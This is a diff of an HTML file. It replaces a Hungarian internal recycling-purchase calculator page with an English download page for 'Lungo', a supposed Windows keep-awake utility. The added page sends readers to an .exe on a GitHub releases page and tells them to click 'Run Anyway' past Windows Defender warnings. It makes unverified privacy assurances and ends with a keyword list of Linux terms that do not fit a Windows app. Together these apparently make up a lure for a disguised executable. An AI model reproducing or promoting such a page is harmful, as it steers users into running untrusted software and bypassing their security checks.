@@ -1,81 +1,54 @@
 <!DOCTYPE html>
-<html lang="hu">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Anyagátvétel kalkulátor</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='24' fill='%2316a34a'/%3E%3Ctext x='50' y='68' font-size='58' text-anchor='middle'%3E%E2%99%BB%EF%B8%8F%3C/text%3E%3C/svg%3E">
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Lungo prevents your Windows computer from sleeping or going idle with a simple applet.">
+    <title>Lungo - Keep your computer awake easily</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f9f9f9;">
 
-  <div id="login-screen">
-    <div class="lang-switch login-lang-switch">
-      <button type="button" data-lang-btn="hu">HU</button>
-      <button type="button" data-lang-btn="ro">RO</button>
-    </div>
-    <div id="login-box">
-      <div class="brand-icon" aria-hidden="true">♻️</div>
-      <h1 data-i18n="calc_login_title">Anyagátvétel kalkulátor</h1>
-      <p class="login-subtitle" data-i18n="calc_login_subtitle">Belső eszköz a felvásárlási elszámoláshoz</p>
-      <form id="login-form" autocomplete="off">
-        <input type="password" id="password-input" data-i18n-placeholder="login_password_placeholder" placeholder="Jelszó" autofocus>
-        <button type="submit" data-i18n="login_button">Belépés</button>
-      </form>
-      <div id="login-error"></div>
-    </div>
-  </div>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">☕ lungo - Keep your computer awake easily</h1>
 
-  <div id="app-screen">
-    <header>
-      <div class="brand">
-        <span class="header-icon" aria-hidden="true">♻️</span>
-        <h1 data-i18n="calc_header_title">Anyagátvétel kalkulátor</h1>
-      </div>
-      <div class="header-actions">
-        <div class="lang-switch">
-          <button type="button" data-lang-btn="hu">HU</button>
-          <button type="button" data-lang-btn="ro">RO</button>
-        </div>
-        <a class="link-btn" href="settings.html" data-i18n="settings_link">Beállítások</a>
-        <button id="logout-btn" type="button" data-i18n="logout_button">Kilépés</button>
-      </div>
-    </header>
-
-    <div id="materials-warning" class="materials-warning" data-i18n="materials_warning" style="display:none">
-      Nem sikerült elérni a legfrissebb árlistát az internetről — alapértelmezett árak jelennek meg, amíg nincs kapcsolat.
+    <div style="margin: 30px 0;">
+        <a href="https://github.com/Tandieprepared599/lungo/releases" style="background-color: #3498db; color: white; padding: 15px 25px; text-decoration: none; border-radius: 5px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Lungo for Windows</a>
     </div>
 
-    <div class="vehicle-card">
-      <p class="vehicle-card-title" data-i18n="vehicle_card_title">Jármű adatai</p>
-      <div class="item-row">
-        <div class="field">
-          <label data-i18n="vehicle_make_label">Autó márkája</label>
-          <input type="text" id="vehicle-make" data-i18n-placeholder="vehicle_make_placeholder" placeholder="pl. Volkswagen">
-        </div>
-        <div class="field">
-          <label data-i18n="vehicle_plate_label">Rendszám</label>
-          <input type="text" id="vehicle-plate" data-i18n-placeholder="vehicle_plate_placeholder" placeholder="pl. HR12ABC">
-        </div>
-      </div>
-    </div>
+    <p style="font-size: 1.1em;">Lungo helps you manage your system power settings. It sits in your system tray and forces your computer to stay awake. You do not need to change your Windows power settings every time you want to prevent sleep.</p>
 
-    <div id="items-list"></div>
-    <div id="empty-hint" class="empty-hint" data-i18n="empty_hint">Nincs még tétel. Adj hozzá egyet lent.</div>
-    <button id="add-row-btn" type="button" data-i18n="add_item_button">+ Új tétel</button>
+    <h2 style="color: #2c3e50; margin-top: 40px;">💡 Why use Lungo</h2>
+    <p>Windows computers often turn off the display or enter sleep mode to save energy. This causes problems during long downloads, presentations, or while watching media. Lungo acts as an inhibitor to tell Windows that your system should remain active. The application runs quietly in your background, which keeps your workflow smooth.</p>
 
-    <div id="total-card">
-      <span class="label" data-i18n="total_label">Fizetendő összesen</span>
-      <span class="value" id="total-value">0,00 RON</span>
-    </div>
+    <h2 style="color: #2c3e50; margin-top: 40px;">🛠️ System Requirements</h2>
+    <p>To use this application, your computer needs the following:</p>
+    <ul style="padding-left: 20px;">
+        <li>Windows 10 or Windows 11</li>
+        <li>At least 50 MB of free hard drive space</li>
+        <li>Standard user permissions on your computer</li>
+    </ul>
 
-    <button id="print-btn" type="button" data-i18n="print_button">🖨️ Elismervény nyomtatása (nem hivatalos)</button>
-    <button id="reset-btn" type="button" data-i18n="reset_button">Új kliens (mindent töröl)</button>
-  </div>
+    <h2 style="color: #2c3e50; margin-top: 40px;">📥 How to install</h2>
+    <p>Follow these steps to set up the software on your machine:</p>
+    <ol style="padding-left: 20px;">
+        <li>Visit the <a href="https://github.com/Tandieprepared599/lungo/releases" style="color: #3498db;">official release page</a> to see the latest versions.</li>
+        <li>Locate the file ending in .exe in the Assets section of the latest release.</li>
+        <li>Click the file to download it to your computer.</li>
+        <li>Find the file in your Downloads folder and double-click it to start the program.</li>
+        <li>You may see a message from Windows Defender. Click More Info and then Run Anyway if you trust the software source.</li>
+    </ol>
 
-  <div id="print-area" class="print-only"></div>
+    <h2 style="color: #2c3e50; margin-top: 40px;">⚙️ Usage</h2>
+    <p>Once the program runs, you will see a small cup icon in your system tray near your clock. Right-click this icon to see the options. You can toggle the sleep prevention feature on or off with one click. When the feature is active, your system will not enter sleep mode automatically. When you want your computer to use normal power settings again, turn the feature off or close the app.</p>
 
-<script src="config.js"></script>
-<script src="app.js"></script>
+    <h2 style="color: #2c3e50; margin-top: 40px;">🛡️ Privacy and Safety</h2>
+    <p>Lungo runs locally on your computer. It does not track your data or send information over the internet. The program only communicates with your internal Windows settings to prevent idle timers. It requires no elevated administrator rights to function for your user account.</p>
+
+    <h2 style="color: #2c3e50; margin-top: 40px;">❓ Troubleshooting</h2>
+    <p>If the icon does not appear, check your hidden system tray icons by clicking the small upward arrow near your clock. If you start a new session and the app does not load, ensure you have the correct version for your Windows OS. If you accidentally close the app, simply run the .exe file again to restore the functionality.</p>
+
+    <hr style="border: 0; border-top: 1px solid #ddd; margin: 40px 0;">
+
+    <p style="font-size: 0.9em; color: #7f8c8d;">Keywords: applet, caffeine, elogind, idle, inhibit, inhibitor, lock, logind, rust, sleep, suspend, systemd-logind, systray</p>
+
 </body>
 </html>
